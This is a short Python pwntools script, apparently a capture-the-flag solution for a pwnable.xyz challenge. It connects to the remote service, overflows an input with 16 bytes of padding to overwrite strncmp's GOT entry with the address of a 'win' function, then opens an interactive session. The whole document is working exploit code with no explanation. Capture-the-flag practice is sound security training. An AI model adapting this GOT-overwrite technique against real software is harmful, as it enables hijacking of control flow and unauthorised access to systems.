from pwn import *

elf = ELF("./challenge")
io = remote("svc.pwnable.xyz", 30031)



io.sendlineafter(b'> ', b'2')
io.sendlineafter(b': ', b'a'*16 + p64(elf.got['strncmp']))

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', str(elf.sym['win']))

io.sendline(b'4')
io.interactive()